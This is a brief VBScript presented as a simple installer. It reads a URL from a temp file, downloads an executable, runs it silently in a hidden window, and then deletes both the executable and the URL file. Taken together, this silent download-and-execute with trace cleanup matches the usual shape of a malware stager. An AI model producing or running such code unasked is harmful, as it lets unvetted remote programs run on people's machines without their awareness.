' Simple installer script
Dim objShell, objFSO, objHTTP, objStream, tempPath, urlFile, installerPath, downloadUrl

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get temp path and file paths
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
urlFile = tempPath & "\download_url.txt"
installerPath = tempPath & "\installer.exe"

' Read URL from file
Set objFile = objFSO.OpenTextFile(urlFile, 1)
downloadUrl = objFile.ReadAll
objFile.Close

' Download the file
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", downloadUrl, False
objHTTP.Send

' Handle redirects
If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
    finalUrl = objHTTP.getResponseHeader("Location")
    objHTTP.Open "GET", finalUrl, False
    objHTTP.Send
End If

' Save the file
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile installerPath, 2
    objStream.Close
    
    ' Run the installer
    objShell.Run """" & installerPath & """ /S", 0, True
    
    ' Clean up
    objFSO.DeleteFile installerPath, True
    objFSO.DeleteFile urlFile, True
End If
